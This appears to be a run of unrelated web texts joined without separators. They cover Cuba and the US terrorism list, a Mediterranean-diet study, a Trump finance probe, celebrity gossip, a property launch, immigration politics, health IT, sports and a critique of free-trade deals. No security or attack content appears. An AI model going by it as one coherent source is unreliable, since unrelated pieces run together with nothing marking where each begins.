Obama made his decision following a State Department review of Cuba's presence on the list, which includes Iran, Sudan and Syria. The four countries have been accused of repeatedly supporting terrorism, with the US accusing Havana of providing refuge to Basque ETA militants and Colombia's FARC.
Relations between Cuba and the US have taken a turn for the better since Obama announced last December that the two countries had decided to put an end to hostilities. Obama met Cuban President Raul castro at the Summit of the Americas last week in Panama, where the two leaders extensively discussed improving ties.
Cuba's ultimate exclusion from the list requires the final approval of the Congress, after which both countries will open embassies in Havana and Washington.

Why you need olive oil on your salad
King's College London

Print E-Mail
A diet that combines unsaturated fats with nitrite-rich vegetables, such as olive oil and lettuce, can protect you from hypertension, suggests a new study led by King's College London. The findings, published in the journal PNAS, help to explain why some previous studies have shown that a Mediterranean diet can reduce blood pressure.
The Mediterranean diet typically includes unsaturated fats found in olive oil, nuts and avocados, along with vegetables like spinach, celery and carrots that are rich in nitrites and nitrates.
When these two food groups are combined, the reaction of unsaturated fatty acids with nitrogen compounds in the vegetables results in the formation of nitro fatty acids.
The study, supported by the British Heart Foundation, used mice to investigate the process by which these nitro fatty acids lower blood pressure, looking at whether they inhibited an enzyme known as soluble Epoxide Hydrolase which regulates blood pressure.
Mice genetically engineered to be resistant to this inhibitory process were found to maintain their high blood pressure despite being fed the type of nitro fatty acids that normally form when a Mediterranean diet is consumed. However, nitro fatty acids were found to lower the blood pressure of normal mice following the same diets.
Thus, the study concludes that the protective effect of the Mediterranean diet, combining unsaturated fats and vegetables abundant in nitrite and nitrate, comes at least in part from the nitro fatty acids generated which inhibit soluble Epoxide Hydrolase to lower blood pressure.
Professor Philip Eaton, Professor of Cardiovascular Biochemistry at King's College London, said: "The findings of our study help to explain why previous research has shown that a Mediterranean diet supplemented with extra-virgin olive oil or nuts can reduce the incidence of cardiovascular problems like stroke, heart failure and heart attacks."

New York’s attorney general has opened a civil investigation into Donald Trump’s business dealings, taking action after his former lawyer told Congress he exaggerated his wealth to obtain loans.
A source said Letitia James issued subpoenas to Deutsche Bank and Investors Bank seeking records related to four Trump property projects and his failed 2014 bid to buy the Buffalo Bills American football club.

Trump’s former lawyer Michael Cohen told Congress in late February that the president exaggerated his wealth on financial statements provided to Deutsche Bank when he was trying to obtain financing to buy the Bills.
Mr Cohen told a House committee it was common for Mr Trump to overstate his wealth when dealing with the news media or banks, but understate it when it came time to pay his taxes.

The subpoenas issued by the attorney general seek loan applications, as well as mortgages, credit lines and other documents related to the Trump International Hotel in Washington DC, buildings in Chicago and New York and a golf course in the Miami area.
Ms James, a Democrat newly elected to office, pledged to look into his business practices, saying after her victory in November that she would be “shining a bright light into every dark corner of his real estate dealings and every dealing”.

Mr Trump has complained that she is waging a politically motivated vendetta against him. Her office is also overseeing a lawsuit against a Trump charitable foundation.
Her predecessors sued Mr Trump over the operations of Trump University, his property school.
Previously, a different New York state agency, which regulates insurance companies, launched an inquiry into Cohen’s allegations that Mr Trump also misled insurance companies about his financial worth.
Mr Trump has said Cohen is lying to try to get out of a prison sentence for tax evasion, campaign finance violations, making false statements to banks and lying to Congress.

IMG SRC: cdn.pinkvilla.com/
After Bollywood, the curvaceous, sexy but insipid Mallika Sherawat has been asked to leave a posh locality in Paris, France. Sources confirm that she was staying in a rented apartment in Paris for about a whopping 6000 Euros a month with her husband Cyrille Auxenfans.
The court has summoned an eviction notice to her and husband. The owners claim that no due payment of rent, not even once after renting the flat has been made to them. Presently the couple owes about 75000 Euros to the owners of the house.
Image SRC: https://qph.ec.quoracdn.net/main-qimg-10ef49d6543a6b5518599a8868be3bb4-c
The court even gave green signal to seize the furniture for auctioning to pay the owners. Now that’s too much Mallika….So much for pricey accommodation.

Crown Group unveils $400 million residential project Waterfall by Crown Group
 By FM Media  21 June 2017
The latest residential project from multi award-winning Australian developer Crown Group, the $400 million Waterfall by Crown Group, was unveiled at the Royal Hall of Industries, Moore Park on Wednesday 17 May.
The evening was a celebration of innovation and design, and guests were treated to the first glimpses of the model of the unique 331-apartment development coupled with exclusive content providing an insight into the project.
Set to revolutionise the use of green space in Australian residential developments, the four-tower residential development will feature Australia’s tallest man-made waterfall.
Crown Group chairman and Group CEO Iwan Sunito says, “After much anticipation we are pleased to share our vision to create a building that will revolutionise the use of green space in residential developments.”
Designed by Sydney-based architects SJB, Waterfall by Crown Group will comprise three seven-storey buildings and an iconic 20-storey sculptural tower overlooking lush, tropical landscaping and a beautiful water garden. Public art is a key element of Waterfall: Mika Utzon Popov, grandson of Sydney Opera House architect Jørn Utzon, is creating a large-scale artwork integrated in the design.
Waterfall by Crown Group offers a collection of luxury apartments including studios, one, two and three- bedroom apartments, courtyard apartments and double-storey penthouses. The interiors offer fresh, natural modern luxury, utilising stone, timber and subtle hues.
Natural luxury resonates through the communal spaces as well, including a tranquil, ground-level water garden, a recreational deck, an Infinity rooftop pool with a sky garden and terrace, and a secluded bamboo- covered walkway. Residents will also enjoy a state-of-the-art cantilevered gym, a rooftop garden, a rooftop cinema, function room with a catering kitchen, music room, and onsite retail.
Crown Group’s unveiling event celebrated the innovation and design of the project; “a reflection of our continued push to go beyond the traditional boundaries of design to meet the needs of the future,” Sunito adds. The evening attracted more than 2000 guests including City of Sydney Lord Mayor Clover Moore, Prince of Malaysia HRH Tunku Naquiyuddin, Crown Group chairman and Group CEO Iwan Sunito and Crown Group CEO Paul Sathio.
The construction of Waterfall by Crown Group is scheduled for completion in 2020. Waterfall by Crown Group’s luxury apartments have been released for sale at a grand launch on 17 June 2017.
The Waterfall by Crown Group display suite is open from 10am to 4pm, seven days a week. A selection of apartments will be available for sale starting from $620,000.
Crown Group is accepting registrations of interest at www.waterfallbycrowngroup.com.au.

Hard-liners are confident heading into immigration battle
News | December 21, 2016
Jonathan Miller and Dean DeChiaro
Tribune News Service
WASHINGTON — Donald Trump’s administration will feature a host of emboldened immigration hard-liners plucked from Congress, chief among them Sen. Jeff Sessions of Alabama, the president-elect’s pick for attorney general.
Trump’s transition team includes several aides with ties to Sessions. Danielle Cutrona, his chief counsel on the Judiciary Committee, is leading the “Immigration Reform & Building the Wall” policy implementation group. Cindy Hayden, another former Judiciary aide, is guiding the transition team at the Department of Homeland Security. Hayden was widely credited with helping to defeat a 2007 immigration overhaul.
But if anyone thinks Republicans can jam through hard-line measures, Rep. Mario Diaz-Balart told Roll Call: think again. A bill that deals strictly with border issues or enforcement is a loser mathematically, he said.
“The only way there is a shot at getting border and interior security through the Senate is if you also deal with the issue of the undocumented,” said the Florida Republican, a principal House negotiator during the failed attempt at a comprehensive immigration bill in 2013-2014.
The new administration promises a sharp, rightward turn on immigration that could result in ramped-up deportations for those with criminal histories, a slowing of legal immigration, increased fencing on the U.S.-Mexico border, and a loss of funding for so-called sanctuary cities.
But it has also left many questions on how Congress will now deal with the issue after years of stalemate, and how much influence the hard-liners will actually wield.
“We went from a state of clarity to a state of chaos,” said Ali Noorani, executive director of the National Immigration Forum, a group that backed the Senate’s comprehensive immigration package in 2013. “I’m not getting the sense that there’s a clear vision from Republicans on how to proceed.”
And yet, out of this chaos, battle lines are already being drawn.
Lawmakers on the right, including Senate Majority Leader Mitch McConnell of Kentucky, have signaled that they’ll look to deal with the southern border in some way — though it’s unclear whether that means building Trump’s much-promised wall.
Currently, there are 702 miles of mostly single-layer fencing along the roughly 2,000-mile border. Legislation passed in 2006 authorized two layers of fencing but was later amended to give flexibility on the matter. Republicans, and Trump, are now talking about a combination of fencing and wall.
Some lawmakers and conservative advocates say they would be in favor of expanding a voluntary system for employers known as E-Verify to check an employee’s legal status — a Trump campaign pledge.
Senate Democrats and some Republicans have staked out an early position, saying they would likely fight any bill that does not in some way address the plight of the children of undocumented immigrants.
Roughly 740,000 of these children have received benefits under a 2012 Obama executive order establishing a program known as Deferred Action for Childhood Arrivals, or DACA. Most commonly, they are referred to as “Dreamers,” derived from an acronym for failed 2010 legislation. Every Dreamer, though, is not part of the DACA program.
During the campaign, Trump vowed to end the program, though Democrats and advocates say doing so could put at risk of deportation those who should be held blameless.
“If they start deporting these innocent, young people, they’re in for a fight, and I take it personally,” said Senate Minority Whip Richard J. Durbin of Illinois. Durbin was an original co-sponsor of a 2001 bill that sought to give legal status to Dreamers.
Durbin and GOP Sen. Lindsey Graham of South Carolina have announced legislation that seeks to extend legal status to Dreamers for three years while the next Congress seeks to tackle other immigration issues. Arizona Republican Sen. Jeff Flake, a bill co-sponsor, introduced a separate effort that would pair protection for Dreamers with language expediting the removal of undocumented criminals.
Durbin holds out hope that Trump may be softening on this issue and is “open to the notion that this is a special class.” Trump praised the Dreamers in a recent Time magazine interview and seemed sympathetic, saying, “They’re in never-never land because they don’t know what’s going to happen.”
Despite the insistence of Democratic leaders, it is unclear whether moderate Republicans in the Senate and red-state Democrats will hold firm in blocking action on an immigration bill that does not deal with the undocumented population.
If Republicans want to get something through the Senate to show voters for the 2018 midterm elections, they’ll need to hold the entire GOP conference together and peel off at least eight Democratic votes to break the 60-vote filibuster threshold.
If Republicans are able to persuade vulnerable Democrats up for re-election in 2018 like Jon Tester of Montana and Joe Manchin III of West Virginia and consolidate GOP support, it’s entirely possible they could jam through a border wall, increased enforcement and expanded E-Verify. Tester told Roll Call that it would be difficult for him to vote against a standalone border security bill.
Advocacy groups are aware of this dynamic.
“It’s pretty obvious that we’ll be working on finding eight Democrats who will break the filibuster,” said Roy Beck of NumbersUSA, a conservative group that has long opposed a pathway to citizenship for undocumented workers. “Because they don’t want to stand against the working man in the next election.”
Perhaps the biggest question mark is Speaker Paul D. Ryan. In 2013, he signaled he favored some way to move the undocumented population to legal status, but that prompted a backlash on the right.
As he was shoring up support to become speaker, Ryan promised the hard-line House Freedom Caucus in 2015 that he would not bring up an immigration bill for the remainder of President Barack Obama’s term that did not have the support of more than half the caucus.
Most notably, the House GOP’s “Better Way” plan released earlier this year dealt only with border security and was silent on legal status for the estimated 11.1 million undocumented immigrants already in the United States.
GOP Rep. Carlos Curbelo of Florida said he and others are working on a bill addressing “all of our immigration issues in this country, which includes border security, a visa program, maybe guest worker, and obviously a way forward for undocumented individuals who have not committed any serious crimes.”
If the border security and legal immigration issues are resolved, Curbelo said, it could be easier to sway Republicans on providing the undocumented a path to legal status.
Given Trump’s victory, it’s easy to write that view off as a pipe dream. But in even the most conservative of circles, there are discussions happening now that envision a scenario in which Trump can secure the border and solve visa issues, and then proceed to address amnesty programs for the undocumented.
“We know the Democrats want an amnesty, and we know Paul Ryan wants an amnesty,” said Beck.
“The question will be: Do you have all the other things in place? (Trump) may be more likely than Obama or Bush to get an amnesty through.”

Overview
Brad provides his clients with the strategic, practical and timely guidance necessary to navigate compliance in complex and evolving regulated environments. In particular, Brad’s practice is focused on three areas – Political Law, Communications Law and the emerging Cannabis industry.
Political Law – Provides strategic advice to candidates, political committees, corporations and trade associations in all areas of Federal and State Political and Election Law. Brad served as General Counsel to Bernie 2016, the presidential campaign of Senator Bernie Sanders and Brad currently serves as General Counsel to the social welfare organization Our Revolution. Prior to joining GSB, Brad served for eight years as Chief of Staff and Senior Legal Advisor to Commissioner Steven T. Walther at the Federal Election Commission, where he had previously served as Assistant General Counsel. During his tenure at the FEC, Brad advised Commissioner Walther, (who served as FEC Chairman in 2009 and as Vice Chairman in 2008), on all aspects of Campaign Finance Law and Administrative Law.

He assists clients with broadcast station transactions and regulatory compliance before the Federal Communications Commission, where he previously served as Special Assistant to the Chief of the Mass Media Bureau and as a Supervisory Attorney. Additionally, Brad has extensive experience assisting broadcast clients with complex transactions, licensing applications and rulemaking proceedings, derived from his prior work experience in private practice with the law firm Hogan & Hartson LLP (now renamed Hogan Lovells US LLP).
Cannabis – Member of GSB’s Cannabis Industry Group, whose experienced attorneys work across multiple disciplines to address emergent legal needs in this nascent, highly regulated industry.

Medicaid Managed Care Market Tracker
updated Thu January 8, 2015
More than half of all Medicaid beneficiaries nationwide receive most or all of their care from risk-based managed care organizations (MCOs) that have state contracts to deliver comprehensive services to enrollees. Not all state Medicaid programs contract with MCOs, but a large and growing number are doing so, and states are also rapidly expanding their use of risk-based managed care to reach larger geographic areas, to serve more medically complex beneficiaries, and to provide long-term services and supports. In addition, states expanding Medicaid under the Affordable Care Act (ACA) are relying largely on comprehensive MCOs to serve the millions of newly eligible adults.
To enhance understanding and analysis of the Medicaid managed care market, the Medicaid Managed Care Market Tracker provides state-level, MCO-level, and parent firm-level information related directly, or by extension, to comprehensive risk-based MCOs in Medicaid. It also provides data on parent firm participation in other insurance markets, which shed light on broader market dynamics. As we launch the Tracker in December 2014, 39 states (including DC) have contracts with Medicaid MCOs and 19 of these states make MCO enrollment data publicly available on their websites. It is noteworthy that over 90% of all Medicaid beneficiaries live in the 39 MCO states. Two-thirds of all Medicaid beneficiaries live in the 19 states that report their MCO enrollment, and beneficiaries enrolled in MCOs in these 19 states account for over 45% of all Medicaid beneficiaries nationally. MCO enrollment data for the other states with comprehensive MCOs will be added as the states make their data available. Key findings on Medicaid managed care based on analysis of data in the Tracker can be found here.
The idea for the Medicaid Managed Care Market Tracker, important conceptual work underlying it, and valuable information sources were developed by Community Catalyst. The Kaiser Family Foundation acknowledges Community Catalyst for these contributions.

AMIA, other groups join call to ease EHR burdens
By Diana Manos

As the Office of the National Coordinator for Health IT comments period drew to a close, a number of organizations weighed in about how to improve electronic health records platforms.
Comments closed Jan. 28 on the Office of the National Coordinator for Health IT's draft recommendation to make electronic health records more user friendly with support over the recommendations and a host of cautions that included going slow with changes and creating panels to help oversee them.
The comments come a day after Pew Charitable Trusts urged ONC to focus on patient safety in EHRs, pediatric systemss in particular.
ONC and the Centers for Medicare an Medicaid Services incorporated stakeholder feedback into a draft strategy they released Nov. 28, that included proposals to reducing the time and effort it takes for physicians to enter data into an EHR; reducing the effort and time it takes to meet regulatory reporting requirements, and; helping to improve the overall ease of using EHRs.
AMIA and other groups responded with a variety of requests that included:
Fix the root cause
CentriHealth, a subsidiary of UnitedHealth Group, called ONC’s draft strategy “noteworthy and commendable,” but said it only addresses the symptoms. “The root cause is the lack of a useful and usable system that supports overall individual care in a complex, diverse health care economy,” CentriHealth said. “In the absence of such a system, the administrative functions have filled this ‘system of care vacuum’ leading to the problems identified.”
How to relieve this? CentriHealth said: “ensure we have the systems for individual care that meet the needs of contemporary medicine and practice. Until then the problems identified will persist and the approaches proposed in the ONC Draft Strategy will be at best damage limitation.”
Streamline requirements for substance use disorder records
The Partnership to Amend 42 CFR Part 2 called for new guidance to align Part 2 (a measure that deals with the federal confidentiality of substance use disorder patient records) with HIPAA, to allow for the transmission of Part 2 records without written consent for treatment, payment, and healthcare operations. The group says Part 2 is an “outdated regulation” and limits the use and disclosure of patients’ substance use records from certain substance use treatment programs.
Currently, patients must submit written consent prior to the disclosure of their substance use disorder record. “Obtaining multiple consents from the patient is burdensome and creates barriers to whole-person, integrated approaches to care, which are part of our current health care framework,” the Partnership said.
Measure the pace of changes
Based on the collective perspectives and experiences of its 35-member companies who serve the majority of hospitals and ambulatory care providers using EHRs across the U.S., the Electronic Health Records Association believes that ONC should use a “measured pace” for introducing change.
“This will be important to successfully updating the systems and workflows, which have been used for many years,” the association said. EHR clinical documentation is embedded with algorithms for clinical care reimbursement needs. “As with all changes that are introduced to health information and technology, especially those that impact clinical workflows, clinicians and clinical support staff need time to learn about the changes and adapt to using new, less prescriptive approaches,” the group said.
Decouple clinical documentation from billing, regulatory, and administrative compliance requirements
In a Jan. 29 announcement, the American Medical Informatics Association “strongly supports” ONC’s proposed strategy to decouple clinical from billing documentation to reduce burden on clinicians. However, AMIA warned, “the core challenge and dominant threat” to this strategy is that “most EHRs are designed to support transaction-based, fee-for-service billing requirements and business processes for regulatory/administrative compliance, rather than reflect clinical observation and treatment.”
To make the decoupling work, the federal government, developers, providers, and payers will all have to agree to the decoupling, AMIA aded, “with the expectation that documentation will be used downstream for clinical decision support and quality/performance reporting as a biproduct of care delivery.”
ON THE RECORD
AMIA CEO Douglas Fridsma, MD, in the group’s comment letter: “Rather than be the focal point of a clinical visit, technology should be invisible to our clinicians’ workflows. Our regulatory and policy approaches need a paradigm shift so that our informatics tools can realize their potential to heal healthcare.”

writer: Iwai Shunji	
Synopsis:
Not all of those amongst us who crave blood are vampires, and not all vampires crave blood. For those of you expecting anything remotely resembling Twilight, Nosferatu, or Bela Lugosi, Vampire may not be your cup of the red elixir of life. . . . Simply put, Vampire gives new meaning to the word “vampire.”
Simon seems like a fairly normal, average young man who’s devoted to his teaching job and ailing mother. Underneath the surface, however, things are not what they seem. Simon hunts through online chat rooms and message boards, searching for the perfect girl: beautiful, shy, and suicidal. Simon has a particular condition: he is compelled to drink blood.
Acclaimed Japanese director Iwai Shunji demonstrates that he is a master of cinematic storytelling in any language. Breathtaking, lyrical camera movement and unconventional framing capture beautifully macabre images while the evocative music and sound design complete the sensory tour de force. The terrific ensemble cast stretches out of its comfort zone and syncs up perfectly with Iwai’s dark vision, which explores the essence of existence and what drives some to end it.

DESCRIPTION
FEATURES
Product Description
The payment gateway, a very frequently talked about term in business transactions around the world today, is all about an ingenious service system to both authorize and process credit cards, debit cards and PayPal payments benefiting hundreds of thousands of online merchants as well as traditional businesses everyday. The process involves encryption of sensitive data related to such transactions and routing them between the payment portal and the bank front-end processor, allowing transactions to take place within a highly smooth and secured environment. PayPal, Worldpay, securepay, Stipe, Square, mindtree, 2Checkout.com are among the leading payment gateways.
In order to complete a transaction the payment gateway needs to take a number of steps in a definite sequence after it receives a customer request via an online facility. Encryption of data is the first major step taken. The web browser instantaneously encrypts the received data for onward transmission to the vendor's web server. In the following step the gateway sends the transaction data to the payment processor that is used by the vendor's acquiring bank. The payment processor then sends the transaction data to the card company, whose card is used by the customer, for authorization. The issuer bank, on verifying the request for authorization, either upholds or rejects the request in the form of approval or denial respectively.
The payment processor transmits an authorization in respect of the vendor and the customer to the payment gateway. which, on receipt of the response sends it onto the website enabling the payment to be processed. After due interpretation a matching response is created on the basis of which the vendor executes the customer order. The whole chain of actions happen sequentially in such a smooth, seamless and efficient manner, that the process of payment is normally wound up in the matter of seconds to the convenience of the customer and the vendor alike. Because an eCommerce business works and thrives on the system of online payment module, it is imperative for the business to be able to offer its customers the option to pay online. While it may sound theoretically alright to have a payment gateway of repute for the purpose, in reality however it may not always be sufficient to impress all intending buyers with a single payment gateway system. This results in a sizeable number of intending buyers walking off empty-handed, depriving the business of potential inflow of revenue.

By JENNY CHISOM October 18, 2016
I have been in pains!
If you follow me on Instagram, you will notice, I put up my pastor and coach's picture last weekend because I was heart broken.
He is Pastor Goodheart Ekwueme, the outgone (as much as I hate to use that) resident pastor of my local assembly in Abuja. I and all those who knows him, are going to miss him soooooooo much, it hurts.

Violence Against Men, Mnombo Madyibi and The VAPP Bill
By JENNY CHISOM October 12, 2016
Quite some fuss has been on about this man in picture MnomboMadyibi who was allegedly hit with a bottle of wine and also suffered attempted suffocation using a red and white teddy bear. But as expected it did not get as much attention like if the switch was fixed (the experience being that of the woman).
We must know that if men keep being treated like non humans, even the violence against women we usually fight for, will only increase astronomically, since after all a woman must live and find her fulfilled being married to a man or at least living and being in relationships with them.

Jets claim K Rose; S Miles, TE Sterling sign RFA tenders

FLORHAM PARK, N.J. (AP) — The New York Jets have claimed kicker Nick Rose off waivers from the Los Angeles Chargers, giving free-agent signing Cairo Santos some camp competition this offseason.
The team also announced Monday that safety Rontez Miles and tight end Neal Sterling have signed their restricted free agent tenders, and wide receiver Brisly Estime has been waived.
Rose spent last summer with San Francisco before being among the 49ers' final cuts. He kicked in eight games for the Redskins and two for the Chargers, going 11 of 14 on field goals and 23 of 26 on extra points. He was waived by Los Angeles last Friday. Rose was originally signed by Atlanta in 2016 as an undrafted free agent out of Texas, but was cut during training camp.
The Jets signed Santos to a one-year, $2 million deal in March after allowing Chandler Catanzaro to leave as a free agent.
Miles led the Jets last season with 26 special teams tackles in 13 games and served as Lachlan Edwards' punt protector. Signed as an undrafted free agent in 2013 out of California University of Pennsylvania, Miles has 105 tackles, one interception and two forced fumbles in his NFL career.
Sterling had six receptions for 82 yards in 11 games during his first season with the Jets. The former Monmouth star played his first two seasons with Jacksonville.
Estime spent last season on injured reserve after tearing an Achilles during organized team activities. He was signed last spring as an undrafted free agent out of Syracuse.

Free Trade Agreements and the Dynamics of Capitalism
Post on: January 30, 2017

The new Trump Administration has officially pulled out of the TPP and announced plans to renegotiate NAFTA. Are these the first signs of a reconfiguration of the neoliberal world order?
Now that the new Trump administration has officially pulled the United States out of the Trans-Pacific Partnership and has announced an intention to renegotiate the North American Free Trade Agreement, it might appear as if the global neoliberal order has suffered a pair of blows.
We nonetheless can be forgiven for harboring strong doubts that much, if anything, in the realm of global trade will change.
The Trans-Pacific Partnership (TPP) has faced strong popular opposition for years, thanks to the work of activists on both sides of the Pacific, North and South, who labored to drag this secret corporate power grab into the light of day. Negotiating governments, including that of the now departed Obama administration, which consistently pressed for the most draconian terms, were fond of declaring the TPP a wonderful deal that would lead to jobs and higher wages. If so, you would think they would have been happy to share the details, but that the text was kept from not only the general public but also national legislatures paints a far different picture. Make no mistake: it is the work of activists who stopped the TPP, not a stroke of the pen by a president.
But we have no room for complacency, for the Transatlantic Trade and Investment Partnership, the Trade In Services Agreement and the Regional Comprehensive Economic Partnership are still being negotiated. And of course a myriad of bilateral agreements remain in place around the world, as does North American Free Trade Agreement (NAFTA) for Canada, Mexico and the United States. The TPP was an attempt to go beyond the already heavily pro-multinational capital, anti-worker, anti-farmer prescriptions of NAFTA, and the above multilateral agreements still being negotiated are modeled on the TPP.
Make no mistake: it is the work of activists who stopped the TPP, not a stroke of the pen by a president.
For now, as the world’s governments jostle for new position in newly unsettled terrain, the Trump administration has given no signals of how it intends to renegotiate existing “free trade” deals or what it will propose in place of the TPP. The only concrete statement it has made is this passage in the January 23 order to withdraw from the TPP: “[I]n order to ensure these outcomes, it is the intention of my Administration to deal directly with individual countries on a one-on-one (or bilateral) basis in negotiating future trade deals.”
The first step, perhaps, in relation to Mexico is the January 26 announcement that the Trump administration is considering imposing a 20 percent tariff against Mexican imports to finance a border wall, but this appears to be a fit of pique after Mexico’s president, Enrique Peña Nieto, canceled a planned summit meeting. There are provisions in U.S. law that allow temporary tariffs to be imposed in the name of “national security,” with Richard Nixon’s imposition of tariffs against Japan in the 1970s put forth as a past example, but that was before the current World Trade Organization and NAFTA regimes that disallow such measures. Capitalists on both sides of the border are sure to vigorously oppose any such tariff.
Otherwise, the Trump administration has issued blustery calls for “fair deals” and braggadocio puffing up Donald Trump’s supposed negotiating prowess. A typical White House passage reads, “To carry out his strategy, the President is appointing the toughest and smartest to his trade team, ensuring that Americans have the best negotiators possible. For too long, trade deals have been negotiated by, and for, members of the Washington establishment.”
Capitalists, not governments, drive trade policy
Trade deals, in fact, have been negotiated on behalf of corporate executives and industry trade-association leaders. European Union officials have done little to disguise the fact that they are negotiating the Transatlantic Trade and Investment Partnership on behalf of corporate interests. The public-interest group Corporate Europe Observatory, upon successfully petitioning to receive documents from the European Commission, found that that of 127 closed meetings preparing for the Transatlantic Partnership talks, at least 119 were with large corporations and their lobbyists.
If the rest of the world harbors hope that, despite the Trump administration’s naked nationalism, the United States will cease taking hard lines in favor of the most draconian pro-corporate language in trade deals, a quick glance at the new team should counsel otherwise.
That’s not unique — although the U.S. Congress was long blocked from seeing the text of the TPP, there were 605 corporate executives and lobbyists who did have access as “trade advisers.” Even in Chile, where President Michelle Bachelet allowed “select” businesses and non-governmental organizations some access during negotiations, the public remained shut out and citizen groups were not granted consultation. Chile already has trade deals with all other TPP countries, so why should Santiago hand over more of its sovereignty?
If the rest of the world harbors hope that, despite the Trump administration’s naked nationalism, the United States will cease taking hard lines in favor of the most draconian pro-corporate language in trade deals, a quick glance at the new team should counsel otherwise. The commerce secretary nominee, Wilbur Ross, isn’t promising. He’s an investment banker who buys companies and then takes away pensions and medical benefits so he can flip those companies for a big short-term profit. Then there is labor secretary nominee Andrew Puzder, who opposes labor regulations while his restaurants have been flooded with complaints of wage theft and sexual harassment. Not to mention President Trump himself, who amassed billions of dollars while leaving behind a trail of laid-off workers in his casinos and ripping off his working-class contractors.
And although the nationalist rhetoric of President Trump seeks to claim that Mexicans are the big winners from NAFTA, in fact Mexico’s farmers and workers have been hurt badly by it.
During the first 20 years of NAFTA, about five million Mexican family farmers were displaced. Subsidized corn from the United States flooded Mexico, sold below the costs of small Mexican farmers. Corn imports from the U.S. increased fivefold and pork imports from the U.S. increased by more than 20 times. Mexican farmers forced off their land either became seasonal workers on growing agribusiness farms, sought work in the cities or migrated north. Seasonal agricultural workers (those working less than six months per year) grew by almost three million — more than doubling their ranks — during the same period that those five million family farmers were displaced. A Mexican worker who earns the minimum wage could buy 38 percent fewer consumer goods in 2014 compared to when NAFTA took effect.
When people are driven off the land and/or can’t find work at home, what do they do? Having to find the means to feed their family, people migrate to where jobs might be found. In many cases, displaced Mexicans are forced to migrate north to find work, often doing so without documentation. They often take the lowest-paid, most marginal work. In the meantime, manufacturing north of the border is shuttered, moved to countries with far lower wages and weaker regulations.
The twin pressures of workers laid off from closed factories and migration from the south puts considerable downward pressure on wages north of the border. And as competing corporations move production overseas, those remaining face competitive pressure to do the same, and when they do the size of the reserve army of labor grows larger and the downward pressure on wages further intensifies.
Capitalist competition drives movement of production
The movement of production to low-wage havens is a direct product of capitalist competition — the relentless drive to fatten profits by cutting costs by any means necessary (wage cuts, work speedups and automation the fastest routes) is the inevitable result. Building a wall and deporting immigrants will do nothing to ameliorate these conditions.
Demonizing immigrants from Mexico is demagoguery, yes, but if President Trump truly believes that immigrants are the cause of job losses in the United States, then he knows little about how capitalism actually operates.
And given Wall Street demands for ever higher profits, and ever more money diverted to speculators, the industrialists of the United States are not about to countenance a reversal of the policies that benefit their bank accounts — policies that they themselves have done so much to have implemented. (Nor will capitalists anyplace else.) Given that the Trump administration is stocked with billionaires, that the capitalist rulers of the U.S. have many levers to pull, and that every indication given by the new administration is an all-out sprint to get as much of a corporate wish list in place before voters realized they’ve been had yet again, any changes to NAFTA are very unlikely to benefit working people.
Working people in all three NAFTA countries have suffered from the deal. Canadian workers have suffered significant losses to their social safety net, as unemployment benefits were cut; government transfers to individuals declined; and Canadian big business interests demanded and received tax cuts on the ground that Canada could not be competitive otherwise. In the United States, the Economic Policy Institute estimates that 850,000 jobs have been lose directly due to NAFTA while, overall, more than five million manufacturing jobs were lost between 1997 and 2004 due to “free trade” deals. Two-thirds of displaced manufacturing workers who were rehired in 2012 experienced a wage cut; the reduction in the majority of cases was at least 20 percent.
The environmental cost of NAFTA has also been disastrous. For example, a U.S. company, Metalclad, sued Mexico because a city government refused to grant it a permit for a waste dump (similarly denied to a Mexican company that previously wanted to use the site).
Mexico lost, and had to grant the permit despite environmental concerns and pay $15.6 million to Metalclad. Another U.S. company, Ethyl Corporation, sued Canada for $250 million because of a ban on a gasoline additive known as MMT, a chemical long believed to be dangerous to health. Ethyl claimed the Canadian ban was an “expropriation” of its “investment” and a violation of the principal of “equal treatment” even though, had a Canadian producer of MMT existed, it would have had the same standard applied. Canada settled to avoid a total defeat, paying Ethyl a smaller amount and reversing its ban.
When corporations sue, they don’t do so in regular court systems. Instead, they sue in secret tribunals in which the judges are corporate lawyers who specialize in representing multi-national corporations!
Yet another U.S. company, S.D. Myers, sued Canada because of a ban on the transportation of PCBs that conformed with both a Canada-United States and a multi-lateral environmental treaty. A tribunal ordered Canada to pay $5.6 million and reverse the ban, negating the two environmental treaties and ignoring the fact that PCBs are known carcinogens banned since 1979 in the U.S. The tribunal ruled that, when formulating an environmental rule, a government “is obliged to adopt the alternative that is most consistent with open trade.” More recently, TransCanada sued the U.S. government over the cancelation of the Keystone XL pipeline.
What causes such results is that corporations are allowed to sue governments to overturn any law or regulation that they claim will hurt profits or even potential future profits. Governments and people are not allowed to sue. When corporations sue, they don’t do so in regular court systems. Instead, they sue in secret tribunals in which the judges are corporate lawyers who specialize in representing multi-national corporations! There are no ethics or conflict-of-interest rules, there are no appeals and the public often is not even notified of hearings. On top of this, a government has to pay millions of dollars in costs even in the rare instances when they win one of these cases.
A weapon aimed at developing countries
El Salvador recently won a case brought against it by an Australian mining company that demanded it be allowed to open a gold mine that would poison a critical source of drinking water on which millions depend. The company had sued for $301 million even though it had invested only a small fraction of that amount. Although the company had to pay some of El Salvador’s costs after losing this case, that is a rarity; the case dragged on for years, a burden itself. Much more often costs of millions of dollars must be borne by governments, plus the risk of losing. Such payment obligations can be a hardship for developing countries, leading to frequent settlements on disadvantageous terms.
The leverage that these one-sided tribunals grant multi-national corporations is also used by hedge-fund speculators. Argentina, for example, was hounded for years by holdout vulture capitalists who refused to settle claims on Argentine government debt that had been bought for pennies on the dollar. Their wait paid off when a new neoliberal president, Mauricio Macri, decided to hand over what sovereignty his country had to Wall Street, agreeing to pay large sums to the holdouts and guaranteeing them profits of more than ten times what they paid for the purchased debt.
The “special master” who oversaw this negotiation is a veteran corporate lawyer who specializes in representing financiers and banks opposed to regulation.
“Free trade” agreements — which in actually have very little to do with trade and much to do with imposing corporate agendas — invariably have iron-clad clauses that require corporate profits to be elevated to the highest principle, using words like “must” and “shall.” On the other hand, language purporting to safeguard health, safety, labor and environmental standards use provisional words like “may” that have no force.
That corporate lawyers who switch hats between corporate advocacy and judging interpret this language adds to the one-sided nature of trade deals. When a secret tribunal hands down a decision favoring a corporation, that becomes a precedent that gets pushed further the next time a similar dispute arises.
Each “free trade” agreement has a key provision elevating corporations above governments. NAFTA’s is Chapter 11, which codifies the “equal treatment” of business interests in accordance with international law and enables corporations to sue over any regulation or other government act that violates “investor rights,” which means any regulation or law that might prevent the corporation from extracting the maximum possible profit.
Under these provisions, taxation and regulation constitute “indirect expropriation” mandating compensation — a reduction in the value of an asset is sufficient to establish expropriation rather than a physical taking of property as required under customary law. Older decisions become precedents for further expansions of investor “rights” and thus constitute the “evolving standard of investor rights” required under “free trade” agreements.
